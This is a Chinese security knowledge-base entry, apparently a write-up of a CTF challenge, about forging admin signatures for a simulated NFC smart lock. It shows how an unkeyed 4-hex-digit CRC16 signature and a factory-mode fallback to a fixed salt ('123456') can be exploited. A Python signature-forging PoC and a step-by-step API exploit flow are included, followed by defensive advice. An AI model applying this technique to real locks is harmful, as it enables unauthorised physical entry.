---
id: web-generic-auth-iot-nfc-lock-predictable-signature-factory-mode
title: IoT 智能锁签名可预测 + 工厂模式降级导致管理员解锁
type: scenario
domain: web
path: web/generic/auth
technique: iot-nfc-lock-predictable-signature
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
tags:
- iot
- nfc
- smart-lock
- authentication
- signature
- crc16
- logic-flaw
cve: []
verification:
  verified_by: verifier-V16
  verified_at: '2026-11-05T02:19:35+08:00'
  notes: '已对照原文与图片04/05/06核对：卡片 payload 为 {device_id,nonce,sig,role}，日志显示 FACTORY DEFAULT SALT: 123456、SALT UPDATED 为随机8位、电池模式每次刷卡耗5%、20次后离线，恢复市电进工厂模式；官方solve脚本用 CRC16_CCITT_FALSE(device_id|nonce|salt|role) 计算4位十六进制签名，工厂模式 salt=123456，最终 role=admin 解解锁。卡内流程与官方脚本一致。原文未截图最终flag回显，但给出完整官方自动化脚本；PoC未本机执行；frontmatter无sources/source_url。'
url: /docs/web/generic/auth/web-generic-auth-iot-nfc-lock-predictable-signature-factory-mode/
draft: false
kb_aliases:
- 智能锁签名绕过
- NFC 卡签名可预测
- CRC16 签名伪造
- 工厂模式盐值降级
- 电量耗尽进入工厂模式
- LOCK-X36D
---

## 一句话结论

智能锁用 `CRC16("device_id|nonce|salt|role")` 作为 4 位十六进制卡片签名，盐值虽是随机 8 位但可通过 4 位签名爆破或触发“电量耗尽→恢复供电→工厂模式”降级为固定盐 `123456`；攻击者拿到公开的 device_id 与新 nonce 后即可本地计算管理员签名，完成解锁。

## 原理

- 锁的验卡流程（从挑战 UI/源码可见）：卡片 payload 为 JSON `{device_id, nonce, sig, role}`；服务端用 `sig = CRC16_CCITT_FALSE(f"{device_id}|{nonce}|{salt}|{role}")` 格式化为 4 位十六进制（`%04X`）进行校验。
- 正常模式下 salt 是随机 8 位值，攻击者不知道；但 sig 只有 4 位十六进制（0x0000–0xFFFF，65536 种），服务端没有速率限制，可以暴力枚举。原文解法 1 即先爆破纯数字/纯字母/十六进制组合得到正常模式签名。
- 更关键的是状态机降级：断开市电切换到电池模式后，每次错误刷卡消耗 5% 电量；连续 20 次错误使电量耗尽、设备离线。恢复市电会触发 `FACTORY_RESET_OK`，设备进入工厂模式并：
  1. 把 salt 重置为固定默认值 `123456`；
  2. 生成新的 nonce；
  3. 仍按同一 CRC16 公式验签。
- 工厂模式下所有输入（device_id 公开、nonce 刚获取、salt 固定、role 可选 admin）均已知，攻击者可在本地计算合法签名，直接以管理员身份解锁。
- 根因是**签名算法无密钥、输入可预测、签名空间过小**，且**故障/降级路径削弱了安全配置**（工厂模式使用固定盐），两个缺陷叠加使认证完全失效。

## 触发条件

1. 攻击者可访问智能锁的 Web/API 接口（`/api/challenge`、`/api/power`、`/api/verify`）。
2. 设备 ID 公开或可从界面/日志获取（本例 `LOCK-X36D`）。
3. 签名算法为公开哈希/CRC，且 salt 可被爆破或降级为默认值。
4. 设备存在电池/工厂模式，且进入工厂模式后 salt 固定、nonce 可重新获取。
5. 无速率限制或速率限制可被绕过（电量耗尽流程不受限）。

## 利用步骤

1. 打开智能锁控制界面，记录设备 ID（如 `LOCK-X36D`）与当前 nonce。
2. 解法 A：对 4 位十六进制 sig 进行爆破（先试纯数字、纯字母、十六进制），找到正常模式可通过的签名；再触发工厂模式重复爆破。
3. 解法 B（有源码/可推断算法时）：
   - `GET /api/challenge` 获取 nonce1；
   - `POST /api/power {"mains_on": false}` 切到电池；
   - 用错误卡 `POST /api/verify` 20 次，耗尽电量使设备离线；
   - `POST /api/power {"mains_on": true}` 恢复市电，触发工厂重置；
   - 再次 `GET /api/challenge` 获取新 nonce2；
   - 本地计算 `sig = CRC16_CCITT_FALSE("LOCK-X36D|nonce2|123456|admin")`；
   - 提交 `{device_id, nonce: nonce2, sig, role: "admin"}` 解锁并获取 flag。
4. 若设备支持多角色，尝试 `role=admin`/`maintainer` 等更高权限。

## PoC

签名计算（与原文官方解法一致）：

```python
def crc16_ccitt_false(data: bytes) -> int:
    crc = 0xFFFF
    for b in data:
        crc ^= (b << 8)
        for _ in range(8):
            if crc & 0x8000:
                crc = ((crc << 1) ^ 0x1021) & 0xFFFF
            else:
                crc = (crc << 1) & 0xFFFF
    return crc & 0xFFFF

def calc_sig(device_id, nonce, salt, role):
    msg = f"{device_id}|{nonce}|{salt}|{role}".encode()
    return f"{crc16_ccitt_false(msg):04X}"

sig = calc_sig("LOCK-X36D", nonce2, "123456", "admin")
```

完整流程（伪代码）：

```python
nonce1 = GET("/api/challenge").json()["state"]["nonce"]
POST("/api/power", json={"mains_on": False})
for _ in range(20):
    POST("/api/verify", json={"card_payload": {
        "device_id": "LOCK-X36D", "nonce": nonce1,
        "sig": "0000", "role": "admin"}, "lock_nonce": nonce1})
POST("/api/power", json={"mains_on": True})
nonce2 = GET("/api/challenge").json()["state"]["nonce"]
sig = calc_sig("LOCK-X36D", nonce2, "123456", "admin")
POST("/api/verify", json={"card_payload": {
    "device_id": "LOCK-X36D", "nonce": nonce2,
    "sig": sig, "role": "admin"}, "lock_nonce": nonce2})
```

## 变体与关联

- 若签名算法未知，可先做黑盒爆破（4 位十六进制仅 65536 次）；若为 4 位字母数字则空间更大，需要结合速率/日志。
- 工厂模式降级思路可推广到其他 IoT 设备：低电量/复位/维护模式常使用固定密钥或关闭校验。
- 同类问题包括固定 nonce、nonce 可重放、签名不含角色、CRC 无密钥等。
- 与“默认口令/默认卡”问题叠加：本案默认管理员卡已过期，但工厂模式仍提供了新的弱密钥路径。

## 检测与防御

- 使用带密钥的签名（HMAC-SHA256）并绑定 device_id、nonce、role、有效期；不要用 CRC/无密钥哈希。
- 工厂/维护模式不得使用固定盐或默认密钥；进入工厂模式需物理授权/签名固件，且默认凭据一次性、强制更改。
- 增加验签速率限制与失败锁定，nonce 一次性且短 TTL；错误尝试不应改变安全配置（电量耗尽不应降级为弱模式）。
- 不向未认证客户端泄露 device_id/salt 等敏感参数；日志中避免打印完整签名/盐值。
- 安全测试覆盖状态机：低电量、掉电重启、恢复供电、工厂复位后的认证强度是否下降。
